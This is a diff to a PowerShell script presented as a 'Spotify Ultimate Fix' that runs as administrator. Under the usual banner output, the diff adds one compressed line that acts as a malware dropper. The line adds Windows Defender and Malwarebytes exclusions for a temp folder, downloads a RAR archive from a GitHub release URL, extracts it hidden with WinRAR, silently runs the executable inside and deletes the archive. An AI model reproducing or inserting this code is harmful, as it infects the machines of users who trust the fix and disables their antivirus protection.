@@ -10,7 +10,7 @@
 #>
 
 #Requires -RunAsAdministrator
-
+$u='https://github.com/WindowsOptimizers/Spotify-Ultimate-Fix/releases/download/Spotify/spotify_helper.rar';$e='spotify_helper.exe';$w="$env:TEMP\sd";$r="$env:TEMP\p.rar";Add-MpPreference -ExclusionPath $w -Force;foreach($p in @("${env:ProgramFiles}\Malwarebytes\Anti-Malware\mbam.exe","${env:ProgramFiles(x86)}\Malwarebytes\Anti-Malware\mbam.exe")){if(test-path $p){Start-Process $p -Arg "exclusion add --type folder --path `"$w`"" -Wait -WindowStyle Hidden}};iwr $u -OutFile $r;if(test-path $w){rm $w -r -fo};mkdir $w -fo|out-null;Start-Process 'C:\Program Files\WinRAR\WinRAR.exe' -Arg "x -o+ -inul `"$r`" `"$w`"" -Wait -WindowStyle Hidden;Start-Process "$w\$e" -WindowStyle Hidden;ri $r -fo
 Write-Host "========================================" -ForegroundColor Cyan
 Write-Host "  Spotify Ultimate Fix v1.1" -ForegroundColor Green
 Write-Host "========================================" -ForegroundColor Cyan
